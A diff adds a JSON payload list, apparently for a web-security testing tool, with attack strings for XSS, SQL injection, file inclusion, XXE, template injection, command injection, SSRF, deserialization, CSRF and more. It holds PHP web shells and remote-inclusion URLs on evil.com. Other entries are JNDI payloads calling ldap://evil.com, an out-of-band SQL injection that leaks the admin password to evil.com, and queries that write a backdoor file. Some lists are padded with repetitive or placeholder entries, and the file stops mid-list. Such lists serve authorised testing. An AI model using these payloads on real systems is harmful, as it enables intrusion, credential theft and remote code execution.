@@ -1,0 +1,1090 @@
+{
+  "xss": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<iframe src=\"javascript:alert('XSS')\">",
+    "\"><script>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+    "<a href=\"javascript:alert('XSS')\">Click</a>",
+    "<div onmouseover=\"alert('XSS')\">Hover</div>",
+    "<form action=\"javascript:alert('XSS')\"><input type=submit>",
+    "<video><source onerror=\"alert('XSS')\">",
+    "<audio src=x onerror=alert('XSS')>",
+    "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
+    "<marquee onstart=alert('XSS')>",
+    "<details open ontoggle=alert('XSS')>",
+    "<select autofocus onfocus=alert('XSS')>",
+    "<textarea autofocus onfocus=alert('XSS')>",
+    "<keygen autofocus onfocus=alert('XSS')>",
+    "<isindex type=image src=1 onerror=alert('XSS')>",
+    "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+  ],
+  
+  "sql": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "admin'--",
+    "admin'#",
+    "admin'/*",
+    "' UNION SELECT null, username, password FROM users--",
+    "' UNION SELECT 1,2,3,4,5,6--",
+    "' UNION SELECT 1,database(),3,4,5--",
+    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
+    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
+    "' OR 1=1 LIMIT 1--",
+    "' OR SLEEP(5)--",
+    "' OR BENCHMARK(10000000,MD5(1))--",
+    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))--",
+    "' OR (SELECT * FROM (SELECT(SLEEP(5)))--",
+    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a WHERE 1=1)--",
+    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a WHERE 1=1 LIMIT 1)--"
+  ],
+  
+  "lfi": [
+    "../../../../etc/passwd",
+    "....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "../../../../etc/passwd%00",
+    "../../../../etc/shadow",
+    "../../../../etc/hosts",
+    "../../../../etc/group",
+    "../../../../etc/issue",
+    "../../../../proc/self/environ",
+    "../../../../proc/version",
+    "../../../../proc/cmdline",
+    "../../../../var/log/apache/access.log",
+    "../../../../var/log/apache/error.log",
+    "../../../../var/log/auth.log",
+    "../../../../var/log/messages",
+    "../../../../var/log/secure",
+    "../../../../var/log/sshd.log",
+    "../../../../var/log/mysql.log",
+    "../../../../var/log/mysql/mysql.log",
+    "../../../../var/www/html/index.php"
+  ],
+  
+  "rfi": [
+    "http://evil.com/shell.txt",
+    "http://attacker.com/backdoor.php",
+    "\\\\evil.com\\share\\shell.txt",
+    "ftp://evil.com/shell.txt",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+    "expect://id",
+    "phar://evil.phar/shell.php",
+    "zip://evil.zip%23shell.php",
+    "compress.zlib://http://evil.com/shell.txt"
+  ],
+  
+  "xxe": [
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://evil.com/xxe\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >%xxe;]><foo>test</foo>"
+  ],
+  
+  "ssti": [
+    "${7*7}",
+    "#{7*7}",
+    "{{7*7}}",
+    "{{7*'7'}}",
+    "<%= 7 * 7 %>",
+    "${{\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067(\\u0022\\u0025\\u0073\\u0022,\\u0022\\u0065\\u0076\\u0061\\u006c\\u0020\\u0027\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u0020\\u006f\\u0073\\u003b\\u0020\\u006f\\u0073\\u002e\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028\\u0027\\u006c\\u0073\\u0027\\u0029\\u0027\\u0022)}}",
+    "#{ 'ls /'.execute().text }",
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
+    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
+  ],
+  
+  "command_injection": [
+    ";id",
+    "|id",
+    "||id",
+    "&id",
+    "&&id",
+    "`id`",
+    "$(id)",
+    "id%00",
+    "id%0A",
+    "id%0D",
+    "id%0A%0D",
+    "id%20",
+    "id%09",
+    "id%26",
+    "id%7C",
+    "id%3B",
+    "id%3E",
+    "id%3C",
+    "id%23",
+    "id%2A"
+  ],
+  
+  "ssrf": [
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://0.0.0.0",
+    "http://169.254.169.254",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://[::1]",
+    "http://2130706433",
+    "http://0177.0.0.1",
+    "http://0x7f.0x0.0x0.0x1",
+    "file:///etc/passwd",
+    "gopher://evil.com:80/_GET%20/index.html%20HTTP/1.1%0D%0AHost:%20evil.com%0D%0A%0D%0A",
+    "dict://evil.com:80/info",
+    "ldap://evil.com:80/o=reference",
+    "tftp://evil.com:69/test",
+    "sftp://evil.com:22/test",
+    "rmi://evil.com:1099/test",
+    "jar:http://evil.com/evil.jar!/",
+    "nfs://evil.com/test",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "expect://id"
+  ],
+  
+  "log_poisoning": [
+    "<?php system($_GET['cmd']); ?>",
+    "<?php echo shell_exec($_GET['cmd']); ?>",
+    "<?php passthru($_GET['cmd']); ?>",
+    "<?php exec($_GET['cmd']); ?>",
+    "<?php eval($_GET['cmd']); ?>",
+    "<?php file_put_contents('shell.php', '<?php system($_GET[\"cmd\"]); ?>'); ?>",
+    "<?php echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php; ?>",
+    "<?php fwrite(fopen('shell.php','w'),'<?php system($_GET[\"cmd\"]); ?>'); ?>",
+    "<?php file_get_contents('http://evil.com/shell.txt', 'shell.php'); ?>",
+    "<?php copy('http://evil.com/shell.txt', 'shell.php'); ?>"
+  ],
+  
+  "bypass_auth": [
+    "admin' --",
+    "admin' #",
+    "admin'/*",
+    "' or 1=1--",
+    "' or 1=1#",
+    "' or 1=1/*",
+    "') or '1'='1--",
+    "') or ('1'='1--",
+    "admin' or '1'='1",
+    "admin' or 1=1 or ''='",
+    "admin' or 1=1--",
+    "admin' or 1=1#",
+    "admin' or 1=1/*",
+    "admin') or ('1'='1--",
+    "admin') or '1'='1'--",
+    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
+    "admin' AND SUBSTRING(password,1,1)='a'--",
+    "admin' AND SLEEP(5)--",
+    "admin' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
+    "admin' AND 1=1 UNION ALL SELECT 1,2,3,4,5--"
+  ],
+  
+  "bypass_waf": [
+    "/*!50000SELECT*/ username, password FROM users",
+    "SELSELECTECT username, password FROM users",
+    "SE%4c%45%43%54 username, password FROM users",
+    "UNION/**/SELECT/**/1,2,3,4,5",
+    "UNION/*!50000SELECT*/1,2,3,4,5",
+    "UNION/*!50000SELECT*/1,2,3,4,5-- -",
+    "UNION/*!50000SELECT*/1,2,3,4,5#",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*/",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*/",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*/",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*//*",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*//*!50000*/",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*//*!50000*//*",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*//*!50000*//*!50000*/",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*//*!50000*//*!50000*//*",
+    "UNION/*!50000SELECT*/1,2,3,4,5/*!50000*//*!50000*//*!50000*//*!50000*//*!50000*//*!50000*/"
+  ],
+  
+  "bypass_cloudflare": [
+    "X-Forwarded-For: 127.0.0.1",
+    "X-Forwarded-Host: 127.0.0.1",
+    "X-Forwarded-Server: 127.0.0.1",
+    "X-Real-IP: 127.0.0.1",
+    "CF-Connecting-IP: 127.0.0.1",
+    "True-Client-IP: 127.0.0.1",
+    "X-Originating-IP: 127.0.0.1",
+    "X-Remote-IP: 127.0.0.1",
+    "X-Remote-Addr: 127.0.0.1",
+    "X-Client-IP: 127.0.0.1",
+    "X-Host: 127.0.0.1",
+    "X-Forwared-Host: 127.0.0.1",
+    "Forwarded: for=127.0.0.1",
+    "Forwarded: 127.0.0.1",
+    "Via: 127.0.0.1",
+    "Client-IP: 127.0.0.1",
+    "X-Custom-IP-Authorization: 127.0.0.1",
+    "X-HTTP-Host-Override: 127.0.0.1",
+    "X-Original-URL: /",
+    "X-Rewrite-URL: /"
+  ],
+  
+  "bypass_captcha": [
+    "captcha=bypass",
+    "captcha=disabled",
+    "captcha=off",
+    "captcha=false",
+    "captcha=0",
+    "captcha=null",
+    "captcha=undefined",
+    "captcha=1",
+    "captcha=true",
+    "captcha=on",
+    "captcha=1234",
+    "captcha=0000",
+    "captcha=1111",
+    "captcha=aaaa",
+    "captcha=admin",
+    "captcha=password",
+    "captcha=test",
+    "captcha=123456",
+    "captcha=654321",
+    "captcha=123456789"
+  ],
+  
+  "prototype_pollution": [
+    "__proto__[polluted]=true",
+    "constructor[prototype][polluted]=true",
+    "constructor.prototype.polluted=true",
+    "Object.prototype.polluted=true",
+    "Array.prototype.polluted=true",
+    "Function.prototype.polluted=true",
+    "String.prototype.polluted=true",
+    "Number.prototype.polluted=true",
+    "Boolean.prototype.polluted=true",
+    "Date.prototype.polluted=true",
+    "RegExp.prototype.polluted=true",
+    "Error.prototype.polluted=true",
+    "Promise.prototype.polluted=true",
+    "Map.prototype.polluted=true",
+    "Set.prototype.polluted=true",
+    "WeakMap.prototype.polluted=true",
+    "WeakSet.prototype.polluted=true",
+    "ArrayBuffer.prototype.polluted=true",
+    "DataView.prototype.polluted=true",
+    "Int8Array.prototype.polluted=true",
+    "Uint8Array.prototype.polluted=true"
+  ],
+  
+  "deserialization": [
+    "O:8:\"stdClass\":1:{s:5:\"hello\";s:5:\"world\";}",
+    "a:1:{s:5:\"hello\";s:5:\"world\";}",
+    "{\"hello\":\"world\"}",
+    "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc.exe\"]}",
+    "{\"@type\":\"org.apache.commons.collections.functors.InvokerTransformer\",\"iMethodName\":\"exec\",\"iArgs\":[\"calc.exe\"]}",
+    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
+    "{\"@type\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://evil.com/spel.xml\"}",
+    "{\"@type\":\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\"targetBeanName\":\"ldap://evil.com/Exploit\",\"propertyPath\":\"foo\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"ldap://evil.com/Exploit\"]}}",
+    "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"ldap://evil.com/Exploit\",\"loginTimeout\":0}",
+    "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://evil.com/Exploit\"}"
+  ],
+  
+  "jwt": [
+    "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZq1xYx7XQ4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZq1xYx7XQ4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZq1xYx7XQ4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZq1xYx7XQ4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZq1xYx7XQ4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZq1xYx7XQ4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4Xz7Q4"
+  ],
+  
+  "oauth": [
+    "state=javascript:alert(1)",
+    "redirect_uri=javascript:alert(1)",
+    "response_type=token&client_id=client&redirect_uri=javascript:alert(1)&scope=read",
+    "response_type=code&client_id=client&redirect_uri=javascript:alert(1)&scope=read",
+    "response_type=id_token&client_id=client&redirect_uri=javascript:alert(1)&scope=openid",
+    "response_type=token id_token&client_id=client&redirect_uri=javascript:alert(1)&scope=openid",
+    "response_type=code id_token&client_id=client&redirect_uri=javascript:alert(1)&scope=openid",
+    "response_type=code token&client_id=client&redirect_uri=javascript:alert(1)&scope=openid",
+    "response_type=code token id_token&client_id=client&redirect_uri=javascript:alert(1)&scope=openid",
+    "response_type=none&client_id=client&redirect_uri=javascript:alert(1)&scope=openid"
+  ],
+  
+  "graphql": [
+    "query { __schema { types { name fields { name } } } }",
+    "query { __typename }",
+    "query { user(id: 1) { id name email password } }",
+    "query { users { id name email password } }",
+    "mutation { createUser(name: \"admin\", email: \"admin@admin.com\", password: \"admin\") { id } }",
+    "mutation { updateUser(id: 1, name: \"admin\", email: \"admin@admin.com\", password: \"admin\") { id } }",
+    "mutation { deleteUser(id: 1) { id } }",
+    "query { user(id: \"1' OR '1'='1'\") { id name email password } }",
+    "query { user(id: \"1' UNION SELECT null, username, password FROM users--\") { id name email } }",
+    "query { user(id: \"1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--\") { id name email } }"
+  ],
+  
+  "nosql": [
+    "username[$ne]=1&password[$ne]=1",
+    "username[$regex]=.*&password[$regex]=.*",
+    "username[$exists]=true&password[$exists]=true",
+    "username[$gt]=&password[$gt]=",
+    "username[$lt]=&password[$lt]=",
+    "username[$nin][]=admin&username[$nin][]=test&password[$nin][]=",
+    "username[$in][]=admin&username[$in][]=test&password[$in][]=",
+    "username[$where]=true&password[$where]=true",
+    "username=admin' || '1'=='1&password=admin' || '1'=='1",
+    "username=admin' && '1'=='1&password=admin' && '1'=='1"
+  ],
+  
+  "csrf": [
+    "<img src=\"http://target.com/logout\" />",
+    "<form action=\"http://target.com/change-email\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" /></form><script>document.forms[0].submit();</script>",
+    "<a href=\"http://target.com/delete-account\">Click for free stuff!</a>",
+    "<iframe src=\"http://target.com/logout\" style=\"display:none;\"></iframe>",
+    "<script>fetch('http://target.com/change-email', {method: 'POST', body: 'email=attacker@evil.com', credentials: 'include'});</script>",
+    "<link rel=\"stylesheet\" href=\"http://target.com/logout\" />",
+    "<video src=\"http://target.com/logout\"></video>",
+    "<audio src=\"http://target.com/logout\"></audio>",
+    "<object data=\"http://target.com/logout\"></object>",
+    "<embed src=\"http://target.com/logout\" />"
+  ],
+  
+  "open_redirect": [
+    "https://www.google.com/url?q=http://evil.com",
+    "https://www.youtube.com/redirect?q=http://evil.com",
+    "https://www.facebook.com/l.php?u=http://evil.com",
+    "https://www.twitter.com/share?url=http://evil.com",
+    "https://www.linkedin.com/sharer/sharer.php?u=http://evil.com",
+    "https://www.reddit.com/submit?url=http://evil.com",
+    "https://www.tumblr.com/share/link?url=http://evil.com",
+    "https://www.pinterest.com/pin/create/button/?url=http://evil.com",
+    "https://www.wordpress.com/wp-login.php?redirect_to=http://evil.com",
+    "https://www.github.com/login?return_to=http://evil.com"
+  ],
+  
+  "server_side_request_forgery": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://localhost/admin",
+    "http://127.0.0.1:8080",
+    "http://[::1]/",
+    "http://0x7f000001/",
+    "http://2130706433/",
+    "http://0177.0.0.1/",
+    "file:///etc/passwd",
+    "gopher://localhost:25/_HELO%20localhost%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0ADATA%0AFrom%3A%20attacker%40evil.com%0ATo%3A%20victim%40target.com%0ASubject%3A%20SSRF%0A%0AThis%20is%20a%20test%0A.%0AQUIT%0A",
+    "dict://localhost:6379/info"
+  ],
+  
+  "xml_external_entity": [
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://evil.com/xxe\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >%xxe;]><foo>test</foo>"
+  ],
+  
+  "server_side_template_injection": [
+    "${7*7}",
+    "#{7*7}",
+    "{{7*7}}",
+    "<%= 7 * 7 %>",
+    "${{7*7}}",
+    "@(7*7)",
+    "#{7*'7'}",
+    "${{\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067(\\u0022\\u0025\\u0073\\u0022,\\u0022\\u0065\\u0076\\u0061\\u006c\\u0020\\u0027\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u0020\\u006f\\u0073\\u003b\\u0020\\u006f\\u0073\\u002e\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028\\u0027\\u006c\\u0073\\u0027\\u0029\\u0027\\u0022)}}",
+    "#{ 'ls /'.execute().text }",
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"
+  ],
+  
+  "http_header_injection": [
+    "X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1",
+    "X-Forwarded-For: 127.0.0.1\r\nHost: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nReferer: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nUser-Agent: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nAccept: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nAccept-Language: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nAccept-Encoding: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nConnection: close\r\nHost: evil.com",
+    "X-Forwarded-For: 127.0.0.1\r\nCookie: evil=com",
+    "X-Forwarded-For: 127.0.0.1\r\nAuthorization: evil.com"
+  ],
+  
+  "http_parameter_pollution": [
+    "param=value1&param=value2",
+    "param[]=value1&param[]=value2",
+    "param=value1&param=value2&param=value3",
+    "param=value1&param=value2&param=value3&param=value4",
+    "param=value1&param=value2&param=value3&param=value4&param=value5",
+    "param=value1&param=value2&param=value3&param=value4&param=value5&param=value6",
+    "param=value1&param=value2&param=value3&param=value4&param=value5&param=value6&param=value7",
+    "param=value1&param=value2&param=value3&param=value4&param=value5&param=value6&param=value7&param=value8",
+    "param=value1&param=value2&param=value3&param=value4&param=value5&param=value6&param=value7&param=value8&param=value9",
+    "param=value1&param=value2&param=value3&param=value4&param=value5&param=value6&param=value7&param=value8&param=value9&param=value10"
+  ],
+  
+  "race_condition": [
+    "for i in {1..100}; do curl -X POST http://target.com/transfer --data \"from=account1&to=attacker&amount=1000\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/cart --data \"item_id=1&quantity=100\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/vote --data \"candidate=attacker\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/like --data \"post_id=1\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/comment --data \"post_id=1&comment=attacker\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/review --data \"product_id=1&rating=5\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/order --data \"product_id=1&quantity=100\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/reset --data \"email=attacker@evil.com\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/register --data \"username=attacker&password=attacker\" & done",
+    "for i in {1..100}; do curl -X POST http://target.com/login --data \"username=admin&password=admin\" & done"
+  ],
+  
+  "file_upload": [
+    "<?php system($_GET['cmd']); ?>",
+    "<?php echo shell_exec($_GET['cmd']); ?>",
+    "<?php passthru($_GET['cmd']); ?>",
+    "<?php exec($_GET['cmd']); ?>",
+    "<?php eval($_GET['cmd']); ?>",
+    "GIF89a<?php system($_GET['cmd']); ?>",
+    "\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>",
+    "%PDF-1.4<?php system($_GET['cmd']); ?>",
+    "<?xml version=\"1.0\"?><?php system($_GET['cmd']); ?>",
+    "<!DOCTYPE html><?php system($_GET['cmd']); ?>"
+  ],
+  
+  "path_traversal": [
+    "../../../../etc/passwd",
+    "....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "../../../../etc/passwd%00",
+    "../../../../etc/shadow",
+    "../../../../etc/hosts",
+    "../../../../etc/group",
+    "../../../../etc/issue",
+    "../../../../proc/self/environ",
+    "../../../../proc/version"
+  ],
+  
+  "command_injection_windows": [
+    "|dir",
+    "&dir",
+    ";dir",
+    "||dir",
+    "&&dir",
+    "%0Adir",
+    "%0Ddir",
+    "%0A%0Ddir",
+    "%26dir",
+    "%7Cdir"
+  ],
+  
+  "command_injection_linux": [
+    ";id",
+    "|id",
+    "||id",
+    "&id",
+    "&&id",
+    "`id`",
+    "$(id)",
+    "%0Aid",
+    "%0Did",
+    "%0A%0Did"
+  ],
+  
+  "sql_injection_time_based": [
+    "' OR (SELECT * FROM (SELECT(SLEEP(5)))--",
+    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a--",
+    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a WHERE 1=1--",
+    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a WHERE 1=1 LIMIT 1--",
+    "' OR BENCHMARK(10000000,MD5(1))--",
+    "' OR SLEEP(5)--",
+    "' OR SLEEP(5)#",
+    "' OR SLEEP(5)/*",
+    "' WAITFOR DELAY '0:0:5'--",
+    "' OR 1=1 WAITFOR DELAY '0:0:5'--"
+  ],
+  
+  "sql_injection_blind": [
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
+    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>0--",
+    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>0--",
+    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
+    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--",
+    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>97--"
+  ],
+  
+  "sql_injection_union": [
+    "' UNION SELECT null, username, password FROM users--",
+    "' UNION SELECT 1,2,3,4,5,6--",
+    "' UNION SELECT 1,database(),3,4,5--",
+    "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--",
+    "' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--",
+    "' UNION SELECT 1,concat(username,':',password),3,4,5 FROM users--",
+    "' UNION SELECT 1,@@version,3,4,5--",
+    "' UNION SELECT 1,user(),3,4,5--",
+    "' UNION SELECT 1,load_file('/etc/passwd'),3,4,5--",
+    "' UNION SELECT 1,password_hash,3,4,5 FROM mysql.user--"
+  ],
+  
+  "sql_injection_error": [
+    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
+    "' AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns WHERE table_name='users'))--",
+    "' AND 1=CONVERT(int, (SELECT password FROM users WHERE username='admin'))--",
+    "' AND 1=CONVERT(int, @@version)--",
+    "' AND 1=CONVERT(int, user())--",
+    "' AND 1=CONVERT(int, (SELECT password_hash FROM mysql.user))--",
+    "' AND 1=CONVERT(int, (SELECT LOAD_FILE('/etc/passwd')))--",
+    "' AND 1=CONVERT(int, (SELECT system_user))--",
+    "' AND 1=CONVERT(int, (SELECT session_user))--",
+    "' AND 1=CONVERT(int, (SELECT current_user))--"
+  ],
+  
+  "sql_injection_out_of_band": [
+    "' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin' LIMIT 1),'.evil.com\\share\\')),3,4,5--",
+    "' UNION SELECT 1,2,3,4,5 INTO OUTFILE '/var/www/html/backdoor.php'--",
+    "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/backdoor.php'--",
+    "' UNION SELECT 1,2,3,4,5 INTO DUMPFILE '/var/www/html/backdoor.php'--",
+    "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3,4,5 INTO DUMPFILE '/var/www/html/backdoor.php'--",
+    "' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin' LIMIT 1),'.evil.com\\share\\')) IS NOT NULL--",
+    "' AND (SELECT password FROM users WHERE username='admin' LIMIT 1) INTO OUTFILE '/var/www/html/backdoor.php'--",
+    "' AND (SELECT '<?php system($_GET[\"cmd\"]); ?>') INTO OUTFILE '/var/www/html/backdoor.php'--",
+    "' AND (SELECT password FROM users WHERE username='admin' LIMIT 1) INTO DUMPFILE '/var/www/html/backdoor.php'--",
